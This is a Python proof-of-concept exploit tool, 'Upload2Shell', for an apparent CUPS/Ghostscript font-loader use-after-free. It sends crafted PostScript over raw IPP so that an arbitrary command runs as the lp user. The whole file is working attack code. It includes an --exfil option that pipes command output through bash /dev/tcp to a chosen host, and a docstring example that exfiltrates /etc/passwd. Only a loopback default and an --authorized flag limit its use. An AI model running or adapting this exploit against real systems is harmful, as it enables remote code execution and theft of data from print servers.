#!/usr/bin/env python3
"""Upload2Shell (CVE-2026-125396) — standalone IPP client for Debian 13.

Sends a PostScript document to a CUPS shared queue over raw IPP (no `lp`
binary, no local shell on the target), which reaches `gstopdf` ->
`gstoraster` -> `gs -dSAFER` and triggers the Type 1 font-loader UAF.

The payload disables `path_control_active` in memory and then runs a
`%pipe%` command as the CUPS filter account (uid=7(lp) on Debian).

Local-lab first. Non-loopback targets require --authorized.

Example:
    python3 cups_poc.py -t 127.0.0.1:6310 -q u2s --cmd 'id > /tmp/pwned'
    docker exec u2s-pwn cat /tmp/pwned

    # reverse exfil to a listener on the host (container -> host)
    python3 cups_poc.py -t 127.0.0.1:6310 -q u2s \
        --exfil 172.17.0.1:9001 --cmd 'id; uname -a; cat /etc/passwd'
"""
from __future__ import annotations

import argparse
import http.client
import ipaddress
import socket
import struct
import sys
import time
import urllib.parse
from pathlib import Path
from typing import Optional

__version__ = "0.2.0"
CVE = "CVE-2026-125396"
TEMPLATE = Path(__file__).with_name("poc-pipe.ps")

# IPP tags
OP_PRINT_JOB = 0x0002
TAG_OPERATION = 0x01
TAG_END = 0x03
TAG_INTEGER = 0x21
TAG_URI = 0x45
TAG_CHARSET = 0x47
TAG_NATURAL_LANGUAGE = 0x48
TAG_NAME = 0x42
TAG_MIME = 0x49


def _esc(text: str) -> str:
    """Escape a PostScript literal string."""
    return text.replace("\\", r"\\").replace("(", r"\(").replace(")", r"\)")


def _attr(tag: int, name: str, value: str) -> bytes:
    n = name.encode()
    v = value.encode()
    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v


def build_ipp(printer_uri: str, user: str, job_name: str, document: bytes) -> bytes:
    body = b"".join([
        _attr(TAG_CHARSET, "attributes-charset", "utf-8"),
        _attr(TAG_NATURAL_LANGUAGE, "attributes-natural-language", "en"),
        _attr(TAG_URI, "printer-uri", printer_uri),
        _attr(TAG_NAME, "requesting-user-name", user),
        _attr(TAG_NAME, "job-name", job_name),
        _attr(TAG_MIME, "document-format", "application/postscript"),
        bytes([TAG_END]),
    ])
    header = struct.pack(">BBHI", 2, 0, OP_PRINT_JOB, 1)
    return header + bytes([TAG_OPERATION]) + body + document


def parse_ipp(data: bytes) -> dict:
    if len(data) < 8:
        return {"error": "short IPP response"}
    _major, _minor, status, request_id = struct.unpack(">BBHI", data[:8])
    out: dict = {"status": status, "request_id": request_id, "attributes": {}}
    i = 8
    while i < len(data):
        tag = data[i]
        i += 1
        if tag == TAG_END:
            break
        if tag < 0x10:  # delimiter tags (0x01..0x0F)
            continue
        if i + 2 > len(data):
            break
        nlen = struct.unpack(">H", data[i:i + 2])[0]
        i += 2
        name = data[i:i + nlen].decode("utf-8", "replace")
        i += nlen
        if i + 2 > len(data):
            break
        vlen = struct.unpack(">H", data[i:i + 2])[0]
        i += 2
        value = data[i:i + vlen]
        i += vlen
        if tag == TAG_INTEGER and vlen == 4:
            out["attributes"][name] = struct.unpack(">i", value)[0]
        else:
            out["attributes"][name] = value.decode("utf-8", "replace")
    return out


def is_loopback(host: str) -> bool:
    if host in ("localhost",):
        return True
    try:
        return ipaddress.ip_address(host).is_loopback
    except ValueError:
        return False


def render_payload(template: Path, command: str) -> bytes:
    text = template.read_text()
    if "__CMD__" not in text:
        raise SystemExit(f"template has no __CMD__ placeholder: {template}")
    return text.replace("__CMD__", _esc(command)).encode()


def submit(host: str, port: int, queue: str, document: bytes,
           timeout: float = 30.0) -> dict:
    uri = f"ipp://{host}:{port}/printers/{queue}"
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    body = build_ipp(uri, "anonymous", "upload2shell", document)
    conn.request("POST", f"/printers/{queue}", body=body, headers={
        "Content-Type": "application/ipp",
        "Content-Length": str(len(body)),
        "Connection": "close",
        "User-Agent": f"Upload2Shell/{__version__}",
    })
    resp = conn.getresponse()
    raw = resp.read()
    conn.close()
    result = parse_ipp(raw)
    result["http_status"] = resp.status
    return result


def main(argv: Optional[list[str]] = None) -> int:
    p = argparse.ArgumentParser(description=f"Upload2Shell {CVE} IPP client")
    p.add_argument("-t", "--target", required=True, help="host:port of the CUPS server")
    p.add_argument("-q", "--queue", default="u2s", help="shared queue name (default u2s)")
    p.add_argument("--cmd", default="id > /tmp/u2s_id.txt", help="command to run as lp")
    p.add_argument("--exfil", help="HOST:PORT — wrap cmd to send output over TCP (bash /dev/tcp)")
    p.add_argument("--template", default=str(TEMPLATE), help="PostScript template with __CMD__")
    p.add_argument("--timeout", type=float, default=30.0, help="HTTP timeout seconds")
    p.add_argument("--authorized", action="store_true", help="allow a non-loopback target")
    p.add_argument("--json", action="store_true", help="machine-readable output")
    p.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    args = p.parse_args(argv)

    if ":" not in args.target:
        print("[-] --target must be host:port", file=sys.stderr)
        return 2
    host, port_s = args.target.rsplit(":", 1)
    try:
        port = int(port_s)
    except ValueError:
        print("[-] invalid port", file=sys.stderr)
        return 2

    if not is_loopback(host) and not args.authorized:
        print("[!] non-loopback target requires --authorized", file=sys.stderr)
        return 2

    command = args.cmd
    if args.exfil:
        if ":" not in args.exfil:
            print("[-] --exfil must be host:port", file=sys.stderr)
            return 2
        eh, ep = args.exfil.rsplit(":", 1)
        command = f"bash -c {_sh_quote(command + f' > /dev/tcp/{eh}/{ep}')}"

    try:
        doc = render_payload(Path(args.template), command)
    except OSError as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 2

    started = time.time()
    try:
        result = submit(host, port, args.queue, doc, args.timeout)
    except (OSError, http.client.HTTPException) as exc:
        print(f"[-] IPP request failed: {exc}", file=sys.stderr)
        return 1

    ok = result.get("status") == 0
    result.update({
        "cve": CVE,
        "target": f"{host}:{port}",
        "queue": args.queue,
        "command": command,
        "payload_bytes": len(doc),
        "elapsed_ms": int((time.time() - started) * 1000),
        "ok": ok,
    })

    if args.json:
        import json
        print(json.dumps(result, indent=2))
    else:
        print(f"Upload2Shell {__version__}  ({CVE})")
        print(f"  target   {host}:{port}/{args.queue}")
        print(f"  payload  {len(doc)} bytes")
        print(f"  command  {command}")
        print(f"  status   0x{result.get('status', 0):04x} "
              f"({'successful-ok' if ok else 'error'})  HTTP {result['http_status']}")
        if "job-id" in result["attributes"]:
            print(f"  job-id   {result['attributes']['job-id']}")
        if not ok:
            for k, v in result["attributes"].items():
                print(f"    {k}: {v}")
    return 0 if ok else 1


def _sh_quote(s: str) -> str:
    return "'" + s.replace("'", "'\\''") + "'"


if __name__ == "__main__":
    raise SystemExit(main())
